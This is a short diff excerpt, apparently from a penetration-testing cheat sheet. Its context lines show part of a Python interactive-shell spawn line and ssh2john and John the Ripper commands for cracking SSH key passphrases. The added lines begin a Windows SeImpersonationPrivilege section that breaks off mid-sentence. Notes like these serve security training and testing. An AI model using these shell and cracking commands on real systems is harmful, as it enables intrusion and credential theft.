@@ -178,3 +178,9 @@ p=subprocess.call(["/bin/sh","-i"])
 `python /usr/share/john/ssh2john.py <ssh_key_file> > hash`
 
 `john --wordlist=/path/to/wordlist hash`
+
+## Windows
+
+### SeImpersonationPrivilege
+
+Allows a user to 
